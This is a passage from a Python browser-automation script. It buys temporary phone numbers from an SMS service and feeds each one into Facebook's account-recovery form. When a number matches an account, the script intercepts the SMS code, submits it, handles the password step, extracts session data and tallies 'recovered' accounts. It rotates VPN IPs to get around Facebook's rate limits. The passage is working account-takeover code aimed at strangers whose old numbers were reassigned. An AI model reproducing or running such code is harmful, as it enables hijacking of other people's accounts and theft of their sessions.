                        print("🔴 Aborting this attempt because service/country could not be selected.")
                        time.sleep(3)
                        continue
                    
                    # Dynamically determine valid buy button candidate texts to search
                    buy_candidates = ["Buy for $0.09", "Buy for $0.099"]
                    configured_text = CONFIG.buy_text
                    if configured_text and configured_text not in buy_candidates:
                        buy_candidates.insert(0, configured_text)
                        
                    print(f"\n🛒 Locating buy button candidates: {buy_candidates}...")
                    # Give the page a tiny bit of time to settle before clicking buy, 
                    # especially if we just selected the country
                    time.sleep(1) 
                    
                    purchase_success = False
                    for buy_attempt in range(1, 11):
                        buy_clicked = False
                        click_err = None
                        close_cookies_if_needed(hero)
                        
                        for candidate in buy_candidates:
                            try:
                                btn = hero.locator(f"button:has-text('{candidate}'), a:has-text('{candidate}'), div[role='button']:has-text('{candidate}')").first
                                if btn.is_visible(timeout=2000):
                                    print(f"🎯 Found visible buy button: '{candidate}'. Clicking it (attempt {buy_attempt}/10)...")
                                    btn.click()
                                    hero.wait_for_load_state("networkidle", timeout=5000)
                                    buy_clicked = True
                                    break
                            except Exception as e:
                                pass
                                
                        if not buy_clicked:
                            try:
                                print(f"⚠️ Direct candidate locator failed. Falling back to generic text click: '{buy_candidates[0]}'...")
                                click_visible_text(hero, buy_candidates[0], timeout_ms=8000)
                                buy_clicked = True
                            except Exception as err:
                                click_err = err
                                
                        if not buy_clicked:
                            print(f"❌ Error clicking BUY button: {click_err}")
                            print("🔍 Checking if we were logged out from Hero SMS...")
                            
                            login_btn = hero.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
                            login_title = hero.get_by_text(re.compile("Log in to your account", re.I)).first
                            
                            if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                                print("⚠️ Session logout detected! Attempting re-login...")
                                if getattr(CONFIG, 'auto_login', False):
                                    try:
                                        login_if_needed(context)
                                    except Exception as ae:
                                        print(f"⚠️ Re-login auto-login handler failed: {ae}")
                                        
                                if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                                    if login_btn.is_visible():
                                        try:
                                            login_btn.click(timeout=2000)
                                        except:
                                            pass
                                    print("🛑 Please log in manually in the Chrome window.")
                                    if login_btn.is_visible():
                                        login_btn.wait_for(state="hidden", timeout=300_000)
                                    else:
                                        login_title.wait_for(state="hidden", timeout=300_000)
                                    print("✅ Re-login confirmed!")
                                    
                                # Re-navigate and re-select
                                navigate_to_get_code(hero)
                                select_service_and_country(hero)
                                
                                print("🔄 Retrying BUY button click after re-login...")
                                close_cookies_if_needed(hero)
                                click_visible_text(hero, CONFIG.buy_text, timeout_ms=10000)
                                buy_clicked = True
                            else:
                                pass # Keep looping to retry next attempt
                            
                        print("⏳ Checking purchase status popup...")
                        purchase_failed = False
                        try:
                            success_toast = hero.get_by_text(re.compile("Numbers purchased successfully", re.I)).first
                            fail_toast = hero.get_by_text(re.compile("no number", re.I)).first
                            
                            for _ in range(10): # Check for up to 5 seconds
                                if success_toast.is_visible():
                                    print("✅ Purchase confirmed by system popup!")
                                    purchase_success = True
                                    break
                                if fail_toast.is_visible():
                                    print("⚠️ System popup: No numbers available!")
                                    purchase_failed = True
                                    break
                                time.sleep(0.5)
                        except Exception:
                            pass
                            
                        if purchase_success:
                            break
                            
                        if purchase_failed:
                            print("Waiting 2 seconds before re-clicking the Buy button...")
                            time.sleep(2)
                            close_cookies_if_needed(hero)
                            continue
                            
                    if not purchase_success:
                        print("❌ Failed to purchase a number after 10 consecutive clicks. Restarting attempt loop...")
                        time.sleep(5)
                        continue
                    
                    # Navigate to Purchases page to view the new number
                    navigate_to_purchases(hero)
                    
                    print("\n📱 Extracting phone number from purchases table...")
                    phone_number = extract_phone_number(hero, CONFIG.purchased_number_selector, top_before)
                    
                    pyperclip.copy(phone_number)
                    print(f"✅ Copied purchased number: {phone_number}")

                    if not is_placeholder_url(CONFIG.target_url):
                        total_numbers_tried += 1
                        
                        try:
                            # The browser is verified and running, fill the page with number
                            print("\n📝 Filling target page with phone number...")
                            result, fb_page = fill_target_page(fb_context, phone_number)
                            
                            if result == "success" and fb_page:
                                print("\n✅ SUCCESS! Account found and recovery in progress!")
                                print("\n🔄 Checking Hero SMS tab to wait for code...")
                                hero.bring_to_front()
                                
                                try:
                                    sms_code = wait_for_sms_code(hero, fb_page=fb_page, timeout_sec=180)
                                    total_spent += price_per_sms
                                    update_daily_stats(spent=price_per_sms)
                                    
                                    print("\n🔄 Switching back to Facebook page to enter code...")
                                    fb_page.bring_to_front()
                                    
                                    submit_success = submit_facebook_code(fb_page, sms_code)
                                    if submit_success:
                                        print("\n🎉 CODE SUBMITTED SUCCESSFULLY! 🎉")
                                        pwd_status, password_used = handle_post_verification(fb_context, fb_page)
                                        if pwd_status in ["success", "2fa"]:
                                            two_fa_str = "2FA" if pwd_status == "2fa" else ""
                                            extract_session_data(fb_context, fb_page, phone_number, password_used, fb_active_name, two_fa=two_fa_str)
                                            accounts_recovered += 1
                                            update_daily_stats(recovered=1)
                                            
                                            print("\n" + "="*60)
                                            if pwd_status == "2fa":
                                                print(f"✅ SUCCESS (2FA)! Recovered Account #{accounts_recovered} in '{fb_active_name}'")
                                            else:
                                                print(f"✅ SUCCESS! Recovered Account #{accounts_recovered} in '{fb_active_name}'")
                                            print("="*60)
                                            
                                            # Clean up Facebook page and browser cleanly
                                            try: fb_page.close()
                                            except: pass
                                            try: fb_browser.close()
                                            except: pass
                                            if fb_port:
                                                close_chrome_on_port(fb_port)
                                            time.sleep(1.5)
                                            sync_profile_to_official(fb_profile_name)
                                            
                                            # Reset profile context variables so the next run spawns a new profile
                                            fb_browser = None
                                            fb_page = None
                                            fb_context = None
                                            fb_port = None
                                            fb_profile_name = None
                                            
                                            if getattr(CONFIG, 'multiple_accounts', False):
                                                # Reset loop variables to continue on stable Hero tab
                                                attempt = 0
                                                continue
                                            else:
                                                # Also close the main Hero SMS browser cleanly if we are exiting the script
                                                if is_standalone:
                                                    try: browser.close()
                                                    except: pass
                                                    close_chrome_on_port(active_port)
                                                success = True
                                                break
                                        else:
                                            print(f"\n❌ Post-verification failed (Status: {pwd_status}). Moving to next number...")
                                            update_daily_stats(failed_logins=1)
                                            delete_failed_number(hero)
                                            time.sleep(2)
                                    else:
                                        print("\n❌ Failed to submit code on Facebook.")
                                        update_daily_stats(failed_logins=1)
                                        delete_failed_number(hero)
                                        time.sleep(2)
                                except RuntimeError as e:
                                    print(f"\n❌ {e}")
                                    delete_failed_number(hero)
                                    time.sleep(2)
                            elif result == "rate_limited":
                                print("\n🛑 Facebook IP Rate-Limit Detected!")
                                print("⏳ Pausing automation for 30 seconds to allow Surfshark IP rotation to take effect...")
                                time.sleep(30)
                                rotate_vpn_if_configured()
                                delete_failed_number(hero)
                                print("\n🔄 Resuming attempt...")
                                time.sleep(2)
                            elif result == "not_found":
                                print("\n❌ No account found with this number.")
                                print("Deleting this number and trying another...")
                                
                                # Delete the failed number from the table
                                delete_failed_number(hero)
                                
                                print("\n🔄 Looping to buy another number...")
                                time.sleep(2)
                            else:
                                print(f"\n❌ Failed to load target recovery form: {result}")
                                print("Deleting this number and trying another...")
                                
                                # Delete the failed number from the table
                                delete_failed_number(hero)
                                
                                print("\n🔄 Looping to buy another number...")
                                time.sleep(2)
                        except Exception as setup_err:
                            print(f"\n❌ Error during Facebook recovery setup: {setup_err}")
                            if fb_page:
                                try: fb_page.close()
                                except: pass
                            if fb_browser:
                                try: fb_browser.close()
                                except: pass
                            if fb_port:
                                try: close_chrome_on_port(fb_port)
                                except: pass
                            
                            # Reset profile variables so a brand new profile is chosen on the next loop iteration
                            fb_browser = None
                            fb_page = None
                            fb_context = None
                            fb_port = None
                            fb_profile_name = None
                            
                            # CRITICAL: Always delete the number we just bought so it doesn't stay active and waste money!
                            print("🧹 Cleaning up: Deleting active purchased number to prevent wasted credits...")
                            try:
                                delete_failed_number(hero)
                            except Exception as delete_err:
                                print(f"⚠️ Error deleting failed number during cleanup: {delete_err}")
                            time.sleep(2)
                            
                            # Log error and continue to the next loop iteration
                            print("🔄 Retrying setup in next attempt...")
                            attempt += 1
                            continue
                except KeyboardInterrupt:
                    print("\n⚠️ Process stopped gracefully by user.")
                    break
                except Exception as e:
                    print(f"\n❌ Error: {e}")
                    if attempt < max_attempts:
                        print(f"Retrying... (attempt {attempt + 1}/{max_attempts})")
            
            session_end_time = time.time()
            elapsed_seconds = int(session_end_time - session_start_time)
            # update_daily_stats(duration=elapsed_seconds) (Handled by app.py to prevent double-counting)
            elapsed_mins = elapsed_seconds // 60
            elapsed_secs_remainder = elapsed_seconds % 60
            
            if success or accounts_recovered > 0:
                print("\n" + "="*60)
                print("✅ AUTOMATION SESSION COMPLETED!")
            else:
                print("\n" + "="*60)
                print("❌ PROCESS FAILED AFTER MAX ATTEMPTS")
                
            print("="*60)
            print(f"⏱️  Total Time Elapsed : {elapsed_mins} minutes, {elapsed_secs_remainder} seconds")
            print(f"🎉 Total Accounts Recovered: {accounts_recovered}")
            print(f"📱 Total Numbers Tried     : {total_numbers_tried}")
            if total_numbers_tried > 0:
                success_rate = (accounts_recovered / total_numbers_tried) * 100
                print(f"📈 Overall Success Rate    : {success_rate:.1f}%")
            print(f"💰 Total Amount Spent      : ${total_spent:.3f}")
            print("="*60)
            
    except KeyboardInterrupt:
        try:
            session_end_time = time.time()
            elapsed_seconds = int(session_end_time - session_start_time)
            # update_daily_stats(duration=elapsed_seconds) (Handled by app.py to prevent double-counting)
            print(f"\n⏱️ Process stopped gracefully by user. Recorded session duration: {elapsed_seconds}s")
        except Exception as se:
            print(f"⚠️ Error saving session duration on stop: {se}")
    except Exception as e:
        print(f"\n❌ High-level runner error: {e}")


if __name__ == "__main__":
    main()
